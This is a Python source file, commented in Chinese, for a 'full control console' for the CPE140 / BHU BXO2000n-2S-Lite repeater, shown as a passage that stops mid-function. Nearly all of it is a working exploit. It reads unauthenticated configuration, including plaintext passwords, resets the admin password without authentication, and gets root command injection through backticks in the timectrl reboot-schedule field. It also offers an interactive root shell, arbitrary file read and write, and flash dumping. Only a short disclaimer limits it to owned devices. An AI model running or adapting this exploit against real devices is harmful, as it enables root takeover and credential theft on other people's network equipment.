#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cpe140.py —— 易阔 CPE140 / BHU BXO2000n-2S-Lite 中继器「完全控制台」(电脑版)

用法:
    python cpe140.py doctor                 # 自检 + 漏洞确认
    python cpe140.py status                 # 概览
    python cpe140.py shell                  # 交互式 root shell
    python cpe140.py sh "id; uname -a"      # 单条 root 命令
    python cpe140.py dump-flash out.bin     # 整片 flash 备份 (救砖)
    python cpe140.py gui                    # 图形界面

原理 —— 两条腿, 都不需要 Web 登录会话:

  A. Web API    /cgi-bin/* 全部未认证, POST + JSON, 自动补 interval 时间戳。
                可读全量配置(含明文口令)、改配置、改管理员密码、重启、恢复出厂。
  B. root RCE   /cgi-bin/timectrl (opcode=3, cronpara=2) 的 4 个值是未转义地拼进
                sh -c "uci -c /etc/config set administrator.reboot.week=<值>"
                用反引号命令替换即可 root 执行。单次载荷上限约 960 字节。

  输出回显      命令输出重定向到 /tmp/.cpeout (tmpfs, 快), 再让 /www/.cpeout 指向它,
                uhttpd 跟随符号链接 → HTTP GET 直接取回。零 flash 写入、无大小限制。
                巧思: 载荷本身不输出任何字符, 所以写进 uci 的值与原值完全相同,
                不会污染 /etc/crontabs/root 的定时重启规则。
  文件推送      裸 body POST /cgi-bin/upload → 落 /tmp/upload.img (tmpfs),
                再 mv 到目标, 实测 ~45 KB/s。

作者: kungful      许可: MIT
仅供自有设备的安全研究与日常运维使用。请勿用于未授权设备。
"""
from __future__ import annotations

import argparse
import atexit
import hashlib
import json
import os
import random
import re
import shlex
import socket
import string
import sys
import time
import urllib.error
import urllib.request

__version__ = "1.0.0"

DEFAULT_HOST = "192.168.188.254"


def factory_pw() -> str:
    """出厂/常用 root 口令：只从本机取，不写进源码（仓库是公开的）。

    取值顺序：环境变量 CPE140_PW -> ~/.cpe140pw -> 空。
    """
    pw = os.environ.get("CPE140_PW", "").strip()
    if pw:
        return pw
    for f in (os.path.expanduser("~/.cpe140pw"), ".cpe140pw"):
        try:
            with open(f, encoding="utf-8") as fh:
                return fh.read().strip().splitlines()[0]
        except (OSError, IndexError):
            continue
    return ""
INJ_MAX = 880                    # 注入载荷安全上限 (实测 ~960 字节)
OUT_TMP = "/tmp/.cpeout"         # 命令输出落点 (tmpfs)
OUT_LINK = "/www/.cpeout"        # 设备文件系统里的符号链接
OUT_URL = "/.cpeout"             # 对应的 HTTP 取回路径
UP_TMP = "/tmp/upload.img"       # /cgi-bin/upload 的固定落点
SH_TMP = "/tmp/.cpesh"           # 长命令临时脚本 (必须和 UP_TMP 分开!)

# 危险配置键: 改动可能让设备失联 / 变砖, 默认拒绝, 需 --force
DANGEROUS_KEYS = {
    "OP_MODE", "VLAN_ENABLED", "PSMODE", "LAN_IP_ADDR", "LAN_NETMASK",
    "LAN_DHCP_SERVER_ENABLED", "DHCP_SERVER_ENABLED", "WLAN0_VAP0_SSID",
    "WLAN0_VAP0_PSK", "WLAN0_VAP5_SSID", "WLAN0_VAP5_PSK",
    "WLAN0_VAP0_CHANNEL", "REG_DOMAIN", "HW_NAT_ENABLED",
}
MODE_MAP = {"gateway": 0, "repeater": 1, "wisp": 2, "ap": 3, "wds": 4}


class CpeError(Exception):
    """设备返回错误 / 网络不通。"""


def _rand(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _hb(n: float) -> str:
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024 or u == "GB":
            return f"{n:.0f}{u}" if u == "B" else f"{n:.1f}{u}"
        n /= 1024.0
    return f"{n}B"


# --------------------------------------------------------------------------- #
class Cpe:
    """CPE140 控制客户端 —— 纯标准库, HTTP 直连(绕过系统代理)。"""

    def __init__(self, host: str = DEFAULT_HOST, port: int = 80,
                 timeout: float = 20.0, verbose: bool = False):
        self.base = f"http://{host}:{port}"
        self.host = host
        self.timeout = timeout
        self.verbose = verbose
        self._sched: dict | None = None       # 定时重启原始配置(注入时用它做前缀)
        self._link_ok = False
        self._jar: dict = {}
        # 关键: 禁用系统代理 —— 局域网设备绝不该走 Clash/代理, 否则每个请求 +4.7s
        self._opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        atexit.register(self.close)

    # ------------------------------ HTTP ------------------------------ #
    def _log(self, *a):
        if self.verbose:
            print("[cpe]", *a, file=sys.stderr)

    def request(self, path: str, data: bytes | None = None,
                ctype: str = "application/json", timeout: float | None = None,
                method: str | None = None) -> bytes:
        req = urllib.request.Request(self.base + path, data=data, method=method)
        req.add_header("Content-Type", ctype)
        req.add_header("User-Agent", f"cpe140-ctrl/{__version__}")
        if self._jar:
            req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in self._jar.items()))
        t0 = time.time()
        try:
            with self._opener.open(req, timeout=timeout or self.timeout) as r:
                body = r.read()
                for h in r.headers.get_all("Set-Cookie") or []:
                    if "=" in h:
                        k, v = h.split(";")[0].split("=", 1)
                        self._jar[k.strip()] = v.strip()
        except urllib.error.HTTPError as e:
            body = e.read()
            if e.code == 404:
                raise CpeError(f"404 {path}") from None
            self._log(f"HTTP {e.code} {path}: {body[:120]!r}")
        except (urllib.error.URLError, socket.timeout, OSError) as e:
            raise CpeError(f"连不上 {self.base} ({e})") from None
        self._log(f"{path} <- {len(body)}B in {time.time()-t0:.2f}s")
        return body

    def api(self, cgi: str, payload: dict | None = None, timeout: float | None = None) -> dict:
        d = dict(payload or {})
        d.setdefault("interval", int(time.time()))
        raw = self.request(f"/cgi-bin/{cgi}", json.dumps(d).encode(), timeout=timeout)
        txt = raw.decode("utf-8", "replace").strip()
        if not txt:
            return {}
        try:
            v = json.loads(txt)
        except json.JSONDecodeError:
            raise CpeError(f"{cgi} 返回非 JSON: {txt[:200]}")
        if isinstance(v, dict) and str(v.get("result")) == "-1":
            raise CpeError(f"{cgi} 返回 result=-1 (参数被拒)")
        return v

    # --------------------------- 只读信息 --------------------------- #
    def sysinfo(self) -> dict:
        return self.api("sysinfo", {"opcode": "1"})

    def wireless_status(self) -> dict:
        return self.api("wireless_status", {"opcode": "1"})

    def wan(self) -> dict:
        return self.api("wan", {"opcode": "1"})

    def lan(self) -> dict:
        return self.api("lan", {"opcode": "1"})

    def wifi_config(self) -> dict:
        return self.api("wireless", {"opcode": "1"})

    def clients(self) -> dict:
        return self.api("lan_dhcpserver", {"opcode": "1"})

    def arp(self) -> list:
        """ARP 表 —— 本固件没有 sys_arplist, 直接走 root 读 /proc/net/arp。"""
        rows = []
        for ln in self.run("cat /proc/net/arp").splitlines()[1:]:
            p = ln.split()
            if len(p) >= 6:
                rows.append({"ip": p[0], "type": p[1], "flags": p[2],
                             "mac": p[3], "device": p[5]})
        return rows

    def active(self) -> dict:
        return self.api("active", {"opcode": "1"})

    def channels(self) -> dict:
        """可用信道 (旧笔记里的 channel_info 在本固件不存在, 用 wireless_channel)。"""
        return self.api("wireless_channel", {"opcode": "1"})

    def adv(self) -> dict:
        return self.api("wireless_adv", {"opcode": "1"})

    def scan(self, wlanid: int = 0, timeout: float = 60.0) -> dict:
        """周边 WiFi 扫描 (设备端较慢)。"""
        d = {"opcode": "1", "wlanid": str(wlanid), "interval": int(time.time())}
        raw = self.request("/cgi-bin/wireless_scan", json.dumps(d).encode(), timeout=timeout)
        try:
            return json.loads(raw.decode("utf-8", "replace") or "{}")
        except json.JSONDecodeError:
            return {}

    def cfg_all(self) -> dict:
        """全量配置 (含明文管理员口令 / WiFi PSK)。"""
        return self.api("easyconfig", {"opcode": "1"})

    def cfg_get(self, key: str | None = None):
        c = self.cfg_all()
        return c if key is None else c.get(key)

    # --------------------------- 配置写入 --------------------------- #
    def cfg_set(self, force: bool = False, **kw) -> dict:
        bad = [k for k in kw if k.upper() in DANGEROUS_KEYS]
        if bad and not force:
            raise CpeError(f"拒绝对危险键写入 {bad}; 确认无误请加 --force")
        p = {"opcode": "3"}
        p.update({k: str(v) for k, v in kw.items()})
        return self.api("easyconfig", p)

    def backup(self, path: str) -> str:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.cfg_all(), f, indent=2, ensure_ascii=False, sort_keys=True)
        return path

    def restore(self, path: str, force: bool = False) -> dict:
        with open(path, encoding="utf-8") as f:
            want = json.load(f)
        cur = self.cfg_all()
        diff = {k: v for k, v in want.items() if cur.get(k) != v}
        if not diff:
            return {"changed": 0}
        return dict(self.cfg_set(force=force, **diff), changed=len(diff))

    # ------------------------- root RCE 通道 ------------------------- #
    def sched(self) -> dict:
        """定时重启的原始 4 个值 (只读一次)。"""
        if self._sched is None:
            try:
                s = self.api("timectrl", {"opcode": "3", "cronpara": "1"})
                self._sched = {k: str(s.get(k, d)) for k, d in (
                    ("AUTO_REBOOT_ENABLED", "1"), ("AUTO_REBOOT_WEEK", "0"),
                    ("AUTO_REBOOT_HOUR", "4"), ("AUTO_REBOOT_MIN", "0"))}
            except CpeError:
                self._sched = {"AUTO_REBOOT_ENABLED": "1", "AUTO_REBOOT_WEEK": "0",
                               "AUTO_REBOOT_HOUR": "4", "AUTO_REBOOT_MIN": "0"}
        return self._sched

    def _inject(self, inner: str, timeout: float = 60.0) -> None:
        """把 inner 作为反引号命令替换塞进 timectrl 的值, 以 root 执行。

        inner 的 stdout 会重定向掉, 因此 uci 里存回的值与原值一致 —— 无副作用。
        """
        s = self.sched()
        # 末尾补一刀 chmod: cp 会把源文件权限(如 /etc/shadow 的 600)带过来,
        # 而 uhttpd 对 600 的文件回 403 —— 统一放开到 644 才能读回。
        payload = f"{s['AUTO_REBOOT_WEEK']}`{inner}; chmod 644 {OUT_TMP} 2>/dev/null`"
        if len(payload) > INJ_MAX:
            raise CpeError(f"注入载荷过长 {len(payload)} > {INJ_MAX}")
        d = {"opcode": "3", "cronpara": "2",
             "AUTO_REBOOT_ENABLED": s["AUTO_REBOOT_ENABLED"],
             "AUTO_REBOOT_HOUR": s["AUTO_REBOOT_HOUR"],
             "AUTO_REBOOT_MIN": s["AUTO_REBOOT_MIN"],
             "AUTO_REBOOT_WEEK": payload}
        self.api("timectrl", d, timeout=timeout)

    _UNSAFE = (chr(96), chr(34), chr(92))   # 反引号/双引号/反斜杠 不能内联进 uci 值
    BUDGET = 620                     # 内联载荷长度上限 (给 uci 前缀+重定向留余量)

    def _ensure_link(self) -> None:
        """建立 /www/.cpeout -> /tmp/.cpeout 的读取通道 (整个会话只建一次)。"""
        if self._link_ok:
            return
        self._inject(f": > {OUT_TMP}; chmod 644 {OUT_TMP}; ln -sf {OUT_TMP} {OUT_LINK}")
        self._link_ok = True

    def _exec(self, cmdline: str, timeout: float = 60.0) -> None:
        """以 root 执行 cmdline, 输出全部扔进 OUT_TMP, 不取回。

        注入点位于 sh -c "uci ... =<值>" 的双引号内部, 因此载荷中出现
        反引号 / 双引号 / 反斜杠 会破坏语法 —— 这类命令改为先上传成脚本再执行。
        """
        if not any(ch in cmdline for ch in self._UNSAFE) and len(cmdline) <= self.BUDGET:
            self._inject(f"( {cmdline} ) > {OUT_TMP} 2>&1", timeout=timeout)
        else:
            self.request("/cgi-bin/upload", (cmdline + chr(10)).encode(),
                         ctype="application/octet-stream", timeout=60)
            self._inject(f"mv -f {UP_TMP} {SH_TMP}; sh {SH_TMP} > {OUT_TMP} 2>&1", timeout=timeout)

    def run(self, cmd: str, timeout: float = 120.0) -> str:
        """以 root 执行命令, 返回 stdout+stderr。"""
        self._ensure_link()
        self._exec(cmd.strip(), timeout)
        return self.request(OUT_URL, timeout=max(60.0, timeout)).decode("utf-8", "replace")

    def run_quiet(self, cmd: str, timeout: float = 60.0) -> None:
        """执行但不取回输出 (少一个来回)。"""
        self._ensure_link()
        self._exec(cmd.strip(), timeout)

    # --------------------------- 文件传输 --------------------------- #
    def push_bytes(self, data: bytes, remote: str, verify: bool = True) -> int:
        """任意二进制上传: 裸 body → /tmp/upload.img → 目标路径。"""
        self._ensure_link()
        self.request("/cgi-bin/upload", data, ctype="application/octet-stream",
                     timeout=max(60.0, len(data) / 15000.0 + 30))
        q = shlex.quote(remote)
        self._exec(f"mv -f {UP_TMP} {q} 2>/dev/null || cp {UP_TMP} {q}", timeout=90)
        if verify:
            n = -1
            try:
                n = int(self.run(f"wc -c < {q}", timeout=60).strip().split()[0])
            except (ValueError, IndexError):
                pass
            if n != len(data):
                raise CpeError(f"上传校验失败: 期望 {len(data)} 实际 {n}")
        return len(data)

    def push(self, local: str, remote: str) -> int:
        with open(local, "rb") as f:
            return self.push_bytes(f.read(), remote)

    def read_bytes(self, remote: str, timeout: float = 300.0) -> bytes:
        """读设备上任意文件 (先落到 tmpfs, 不吃 flash)。"""
        self._ensure_link()
        q = shlex.quote(remote)
        self._exec(f"cp {q} {OUT_TMP} 2>/dev/null || cat {q} > {OUT_TMP}", timeout=timeout)
        return self.request(OUT_URL, timeout=timeout)

    def pull(self, remote: str, local: str) -> int:
        data = self.read_bytes(remote)
        with open(local, "wb") as f:
            f.write(data)
        return len(data)

    # ------------------------- 管理动作 ------------------------- #
    def reboot(self, wait: bool = False) -> bool:
        try:
            self.api("devmanage", {"opcode": "5"}, timeout=10)
        except CpeError:
            pass
        return self.wait_alive() if wait else True

    def wait_alive(self, timeout: float = 180) -> bool:
        t0 = time.time()
        while time.time() - t0 < timeout:
            time.sleep(3)
            try:
                if "PRODUCTNAME" in self.sysinfo():
                    return True
            except CpeError:
                continue
        return False

    def set_password(self, newpw: str, user: str = "admin", old: str = "root") -> dict:
        """未认证改 Web 管理员口令 (devmanage opcode=8)。"""
        return self.api("devmanage", {"opcode": "8", "currentuser": user,
                                      "name": user, "oldpassword": old, "password": newpw})

    def set_schedule(self, enabled: bool, week: int = 0, hour: int = 4, minute: int = 0) -> dict:
        r = self.api("timectrl", {"opcode": "3", "cronpara": "2",
                                  "AUTO_REBOOT_ENABLED": "1" if enabled else "0",
                                  "AUTO_REBOOT_WEEK": str(week),
                                  "AUTO_REBOOT_HOUR": str(hour),
                                  "AUTO_REBOOT_MIN": str(minute)})
        self._sched = None
        return r

    def set_mode(self, mode: str, force: bool = False) -> dict:
        """工作模式切换。本固件没有 fit_fat_switch, 只能改 easyconfig 的 OP_MODE。

        警告: 只改 OP_MODE 不会自动重建模式相关的网络配置, 可能让设备失联。
        0=网关 1=中继 2=WISP(本机当前) 3=AP 4=WDS
        """
        if mode not in MODE_MAP:
            raise CpeError(f"模式必须是 {list(MODE_MAP)} 之一")
        if not force:
            raise CpeError("模式切换高风险(可能失联), 请加 --force")
        try:
            return dict(self.api("fit_fat_switch", {"opcode": "2", "LAN_DHCP": "1",
                                                     "OP_MODE": str(MODE_MAP[mode]),
                                                     "needreboot": "1",
                                                     "DHCP_SERVER_ENABLED": "0",
                                                     "PSMODE": "1"}), via="fit_fat_switch")
        except CpeError:
            r = self.cfg_set(force=True, OP_MODE=MODE_MAP[mode])
            return dict(r, via="easyconfig", warning="需手动重启并重连, 模式相关配置可能需重建")

    def factory_reset(self) -> dict:
        return self.api("devmanage", {"opcode": "3"}, timeout=10)

    def upgrade(self, local: str, force: bool = False) -> dict:
        """固件升级 (devmanage opcode=4, multipart)。刷错即变砖。"""
        if not force:
            raise CpeError("刷固件有变砖风险, 请加 --force")
        with open(local, "rb") as f:
            fw = f.read()
        bnd = "----cpe" + _rand(12)
        body = (f"--{bnd}\r\nContent-Disposition: form-data; name=\"filename\"; "
                f"filename=\"{os.path.basename(local)}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n").encode() \
            + fw + f"\r\n--{bnd}--\r\n".encode()
        raw = self.request("/cgi-bin/devmanage?opcode=4", body,
                           ctype=f"multipart/form-data; boundary={bnd}",
                           timeout=max(120.0, len(fw) / 8000.0))
        try:
            return json.loads(raw.decode("utf-8", "replace") or "{}")
        except json.JSONDecodeError:
            return {"raw": raw.decode("utf-8", "replace")[:200]}

    # --------------------------- 综合 --------------------------- #
    def dump_flash(self, path: str, mtd: int = 9, progress: bool = True) -> int:
        """整片 flash 备份 (默认 mtd9 fullflash = 8MB)。"""
        if progress:
            print(f"[*] 读取 /dev/mtd{mtd} → {path} (8MB, 约 10 秒)…", file=sys.stderr)
        data = self.read_bytes(f"/dev/mtd{mtd}", timeout=600)
        with open(path, "wb") as f:
            f.write(data)
        return len(data)

    def shell(self) -> None:
        info = self.sysinfo()
        print(f"CPE140 root shell @ {self.host}   "
              f"{info.get('PRODUCTNAME','?')} / {info.get('FIRMVERSION','?')}")
        print("内置: exit 退出 | cd 切目录 | !push 本地上传 | !pull 下载 | !local 本机命令\n")
        cwd = "/"
        while True:
            try:
                line = input(f"root@cpe140:{cwd}# ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not line:
                continue
            if line in ("exit", "quit", "logout"):
                return
            if line.startswith("!local "):
                os.system(line[7:])
                continue
            for op, off, fn in (("!push ", 6, self.push), ("!pull ", 6, self.pull)):
                if line.startswith(op):
                    try:
                        a, b = shlex.split(line[off:])
                        print(f"-> {fn(a, b)} 字节")
                    except Exception as e:              # noqa: BLE001
                        print("失败:", e)
                    break
            else:
                if line.startswith("cd "):
                    try:
                        cwd = self.run(f"cd {cwd} 2>/dev/null; cd {line[3:]} "
                                       f"&& pwd").strip().splitlines()[-1] or cwd
                    except Exception as e:              # noqa: BLE001
                        print(e)
                    continue
                try:
                    out = self.run(f"cd {cwd} && {line}")
                except CpeError as e:
                    print("错误:", e)
                    continue
                sys.stdout.write(out if out.endswith("\n") or not out else out + "\n")

    def doctor(self) -> list[tuple[str, str, str]]:
        """自检: 连通性 + 这些漏洞是否仍然存在。"""
        res: list[tuple[str, str, str]] = []

        def add(item, ok, note):
            res.append((item, "OK" if ok else "FAIL", note))

        try:
            si = self.sysinfo()
            add("设备连通", ("PRODUCTNAME" in si or "FIRMVERSION" in si),
                f"{si.get('PRODUCTNAME','?')} / {si.get('FIRMVERSION','?')}")
        except CpeError as e:
            add("设备连通", False, str(e))
            return res

        try:
            c = self.cfg_all()
            add("未认证读全量配置", len(c) > 20,
                f"{len(c)} 项, 明文管理员口令={c.get('USER_PASSWORD')!r}")
        except CpeError as e:
            add("未认证读全量配置", False, str(e))

        try:
            t0 = time.time(); self.run("true"); base = time.time() - t0
            t0 = time.time(); self.run("sleep 3"); slow = time.time() - t0
            add("root RCE 命令注入", slow - base > 2.0, f"true={base:.2f}s / sleep3={slow:.2f}s")
        except CpeError as e:
            add("root RCE 命令注入", False, str(e))

        try:
            i = self.run("id").strip()
            add("以 root 执行", "uid=0" in i, i)
        except CpeError as e:
            add("以 root 执行", False, str(e))

        try:
            pw = factory_pw()
            add("出厂 root 口令", bool(pw),
                (f"SSH: root / {pw} (dropbear 22 端口)" if pw else
                 "未配置。本机把口令写进 ~/.cpe140pw 或 export CPE140_PW=... "
                 "（公开仓库里不硬编码，避免替人开后门）"))
        except Exception:                                # noqa: BLE001
            pass
        return res

    def close(self) -> None:
        """清理设备上的读取通道 (幂等, 进程退出自动调用)。"""
        if not getattr(self, "_link_ok", False):
            return
        self._link_ok = False
        try:
            self._inject(f"rm -f {OUT_TMP} {OUT_LINK} {UP_TMP} {SH_TMP}")
        except Exception:                                # noqa: BLE001
            pass


# --------------------------------------------------------------------------- #
def gui(host: str, port: int) -> None:                   # pragma: no cover
    import queue
    import threading
    import tkinter as tk
    from tkinter import filedialog, messagebox, simpledialog, ttk

    cpe = Cpe(host, port, timeout=60)
    q: queue.Queue = queue.Queue()
    root = tk.Tk()
    root.title(f"CPE140 完全控制台 — {host}")
    root.geometry("1000x740")

    top = ttk.Frame(root, padding=6); top.pack(fill="x")
    ttk.Label(top, text="设备:", font=("", 10, "bold")).pack(side="left")
    host_var = tk.StringVar(value=host)
    ttk.Entry(top, textvariable=host_var, width=18).pack(side="left", padx=4)
    status = ttk.Label(top, text="就绪", foreground="#0a0"); status.pack(side="left", padx=10)
    nb = ttk.Notebook(root); nb.pack(fill="both", expand=True, padx=6, pady=4)
    cur: dict = {}

    def mk_text(parent):
        f = ttk.Frame(parent); f.pack(fill="both", expand=True)
        t = tk.Text(f, wrap="none", bg="#0f1418", fg="#cfe8cf",
                    insertbackground="#cfe8cf", font=("Consolas", 9))
        sb = ttk.Scrollbar(f, command=t.yview); t.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y"); t.pack(fill="both", expand=True)
        return t

    def target(txt):
        cur["t"] = txt

    def show(res, txt=None):
        txt = txt or cur["t"]
        s = res if isinstance(res, str) else json.dumps(res, ensure_ascii=False, indent=2)
        txt.delete("1.0", "end"); txt.insert("end", s + "\n"); txt.see("end")

    def bg(fn, txt=None, title=None):
        if txt:
            target(txt)
        if title:
            cur["t"].insert("end", f"\n=== {title} ===\n")
        status.configure(text="执行中…", foreground="#c80")

        def work():
            try:
                r = fn()
            except Exception as e:                       # noqa: BLE001
                r = f"!! {type(e).__name__}: {e}"
            q.put((r, txt))
        threading.Thread(target=work, daemon=True).start()

    def pump():
        try:
            while True:
                r, txt = q.get_nowait()
                status.configure(text="就绪", foreground="#0a0")
                if txt is not None:
                    show(r, txt)
                else:
                    cur["t"].insert("end", (r if isinstance(r, str)
                                            else json.dumps(r, ensure_ascii=False, indent=2)) + "\n")
                    cur["t"].see("end")
        except queue.Empty:
            pass
        root.after(150, pump)

    def bar(parent):
        b = ttk.Frame(parent, padding=4); b.pack(fill="x"); return b

    # 概览
    t1 = ttk.Frame(nb); nb.add(t1, text=" 概览 "); b1 = bar(t1); x1 = mk_text(t1)
    for lbl, fn in (("设备信息", cpe.sysinfo), ("链路状态", cpe.wireless_status),
                    ("WAN", cpe.wan), ("LAN", cpe.lan), ("无线配置", cpe.wifi_config)):
        ttk.Button(b1, text=lbl, width=10,
                   command=lambda f=fn, l=lbl: bg(f, x1, l)).pack(side="left", padx=2)
    ttk.Button(b1, text="自检/漏洞确认", width=14,
               command=lambda: bg(lambda: "\n".join(
                   f"{n:22s} {o:4s} {c}" for n, o, c in cpe.doctor()), x1, "doctor")
               ).pack(side="left", padx=8)

    # 客户端
    t2 = ttk.Frame(nb); nb.add(t2, text=" 客户端/扫描 "); b2 = bar(t2); x2 = mk_text(t2)
    for lbl, fn in (("DHCP 客户端", cpe.clients), ("ARP 表", cpe.arp),
                    ("WiFi 扫描", lambda: cpe.scan(0)), ("信道占用", cpe.channels),
                    ("会话", cpe.active)):
        ttk.Button(b2, text=lbl, width=12, command=lambda f=fn, l=lbl: bg(f, x2, l)).pack(side="left", padx=2)

    # 配置
    t3 = ttk.Frame(nb); nb.add(t3, text=" 配置 "); b3 = bar(t3); x3 = mk_text(t3)
    ttk.Button(b3, text="读取全部", command=lambda: bg(cpe.cfg_all, x3, "全部配置")).pack(side="left", padx=2)
    def _bk():
        fn = filedialog.asksaveasfilename(defaultextension=".json",
                                          initialfile="cpe140_cfg.json") or "cpe140_cfg.json"
        return "已备份 -> " + cpe.backup(fn)

    ttk.Button(b3, text="备份到文件", command=lambda: bg(_bk, x3, "备份")).pack(side="left", padx=2)
    kv_k = tk.StringVar(); kv_v = tk.StringVar()
    ttk.Label(b3, text="  KEY").pack(side="left")
    ttk.Entry(b3, textvariable=kv_k, width=20).pack(side="left")
    ttk.Entry(b3, textvariable=kv_v, width=20).pack(side="left", padx=2)
    ttk.Button(b3, text="写入", command=lambda: bg(
        lambda: cpe.cfg_set(**{kv_k.get(): kv_v.get()}), x3, "写入")).pack(side="left")

    # 终端
    t4 = ttk.Frame(nb); nb.add(t4, text=" 终端 (root) "); b4 = bar(t4); x4 = mk_text(t4)
    var = tk.StringVar(value="id; uname -a; cat /proc/mtd")
    ent = ttk.Entry(b4, textvariable=var, font=("Consolas", 10))
    ent.pack(side="left", fill="x", expand=True)
    ttk.Button(b4, text="执行", command=lambda: (x4.insert("end", f"\n$ {var.get()}\n"),
                                                 x4.see("end"),
                                                 bg(lambda: cpe.run(var.get()), x4))).pack(side="left", padx=3)
    ent.bind("<Return>", lambda _e: (bg(lambda: cpe.run(var.get()), x4)))
    for lbl, c in (("id", "id"), ("ps", "ps w"), ("uci", "uci show"),
                   ("mtd", "cat /proc/mtd"), ("日志", "logread | tail -30")):
        ttk.Button(b4, text=lbl, width=6,
                   command=lambda cc=c: (var.set(cc), bg(lambda: cpe.run(cc), x4))).pack(side="left")

    # 维护
    t5 = ttk.Frame(nb); nb.add(t5, text=" 维护 "); b5 = bar(t5); x5 = mk_text(t5)
    def _dump():
        fn = filedialog.asksaveasfilename(defaultextension=".bin",
                                          initialfile="cpe140_fullflash.bin") or "fb.bin"
        return f"已备份 {_hb(cpe.dump_flash(fn))} -> {fn}"

    ttk.Button(b5, text="备份整片 flash", command=lambda: bg(_dump, x5, "flash")).pack(side="left", padx=3)
    ttk.Button(b5, text="改 Web 口令", command=lambda: bg(
        lambda: cpe.set_password(simpledialog.askstring("改密", "新口令:", show="*") or ""),
        x5, "改密")).pack(side="left", padx=3)
    ttk.Button(b5, text="重启设备", command=lambda: messagebox.askyesno(
        "确认", "重启设备? 会短暂断网。") and bg(
        lambda: "重启命令已发送" if cpe.reboot() else "失败", x5, "重启")).pack(side="left", padx=3)
    ttk.Button(b5, text="清残留并退出", command=lambda: (cpe.close(), root.destroy())).pack(side="left", padx=3)
    root.after(150, pump)
    root.mainloop()


# --------------------------------------------------------------------------- #
def _rows(v):
    if isinstance(v, list):
        return [x for x in v if isinstance(x, dict)]
    if isinstance(v, dict):
        for k in ("list", "data", "items", "dhcpd_leases", "clientlist", "aplist"):
            if isinstance(v.get(k), list):
                return [x for x in v[k] if isinstance(x, dict)]
        return [v]
    return []


def _table(rows):
    if not rows:
        print("(空)"); return
    cols = list(rows[0].keys())
    w = [max(len(str(c)), *(len(str(r.get(c, ""))) for r in rows)) for c in cols]
    line = "  ".join(str(c).ljust(x) for c, x in zip(cols, w))
    print(line); print("-" * len(line))
    for r in rows:
        print("  ".join(str(r.get(c, "")).ljust(x) for c, x in zip(cols, w)))


def main(argv=None) -> int:
    p = argparse.ArgumentParser(
        prog="cpe140", description="易阔 CPE140 / BHU BXO2000n-2S-Lite 中继器完全控制台",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("--host", default=os.environ.get("CPE140_HOST", DEFAULT_HOST))
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--json", action="store_true", help="原始 JSON 输出")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--version", action="version", version=f"cpe140-ctrl {__version__}")
    sub = p.add_subparsers(dest="cmd")

    for name, helptext in (("info", "设备信息/型号/固件"), ("status", "上行链路 + WAN/LAN 概览"),
                           ("clients", "DHCP 客户端列表"), ("arp", "ARP 表"),
                           ("channels", "信道占用"), ("wifi", "本机 AP + 上行无线配置"),
                           ("sessions", "Web 会话"), ("doctor", "自检 + 漏洞确认"),
                           ("gui", "图形界面"), ("shell", "交互式 root shell"),
                           ("uci", "uci show 全量"), ("clean", "清理设备上的临时文件"),
                           ("reboot", "重启设备")):
        sp = sub.add_parser(name, help=helptext)
        if name == "reboot":
            sp.add_argument("--wait", action="store_true")

    sp = sub.add_parser("scan", help="周边 WiFi 扫描"); sp.add_argument("--wlanid", type=int, default=0)
    sp = sub.add_parser("sh", help="以 root 执行命令")
    sp.add_argument("command", nargs="+"); sp.add_argument("--timeout", type=float, default=120.0)
    sp = sub.add_parser("cat", help="读设备上任意文件 (root)")
    sp.add_argument("file"); sp.add_argument("-o", "--out")
    sp = sub.add_parser("cfg", help="读配置 (全部/指定 key/正则过滤)")
    sp.add_argument("keys", nargs="*"); sp.add_argument("--grep")
    sp = sub.add_parser("set", help="写配置 KEY=VALUE …")
    sp.add_argument("kv", nargs="+"); sp.add_argument("--force", action="store_true")
    sp = sub.add_parser("backup", help="备份全量配置到 JSON"); sp.add_argument("file")
    sp = sub.add_parser("restore", help="从 JSON 恢复配置")
    sp.add_argument("file"); sp.add_argument("--force", action="store_true")
    sp = sub.add_parser("push", help="上传文件到设备"); sp.add_argument("local"); sp.add_argument("remote")
    sp = sub.add_parser("pull", help="从设备下载文件"); sp.add_argument("remote"); sp.add_argument("local")
    sp = sub.add_parser("dump-flash", help="整片 flash 备份 (救砖)")
    sp.add_argument("out", nargs="?", default="cpe140_fullflash.bin")
    sp.add_argument("--mtd", type=int, default=9)
    sp = sub.add_parser("password", help="改 Web 管理员口令 (免认证)")
    sp.add_argument("newpw"); sp.add_argument("--user", default="admin")
    sp = sub.add_parser("schedule", help="定时重启设置")
    sp.add_argument("--off", action="store_true"); sp.add_argument("--week", type=int, default=0)
    sp.add_argument("--hour", type=int, default=4); sp.add_argument("--minute", type=int, default=0)
    sp = sub.add_parser("mode", help="工作模式切换 (危险)")
    sp.add_argument("mode", choices=list(MODE_MAP)); sp.add_argument("--force", action="store_true")
    sp = sub.add_parser("factory-reset", help="恢复出厂 (危险!)"); sp.add_argument("--yes", action="store_true")
    sp = sub.add_parser("upgrade", help="固件升级 (危险!)")
    sp.add_argument("file"); sp.add_argument("--force", action="store_true")

    a = p.parse_args(argv)
    if not a.cmd:
        p.print_help(); return 0
    cpe = Cpe(a.host, a.port, getattr(a, "timeout", 30.0) or 30.0, a.verbose)

    try:
        if a.cmd == "gui":
            gui(a.host, a.port); return 0
        if a.cmd == "shell":
            cpe.shell(); return 0
        if a.cmd == "clean":
            cpe.close()
            left = cpe.run("rm -f /tmp/.cpeout /tmp/.cpesh /tmp/upload.img /www/.cpeout; "
                           "ls -a /tmp /www | grep -ci cpe").strip()
            print(f"已清理设备临时文件 (残留 {left or 0} 项)"); return 0
        if a.cmd == "reboot":
            print("重启中…" if cpe.reboot(a.wait) else "失败"); return 0
        if a.cmd == "doctor":
            for n, o, c in cpe.doctor():
                print(f"{n:22s} {o:4s} {c}")
            return 0
        if a.cmd == "factory-reset":
            if not a.yes:
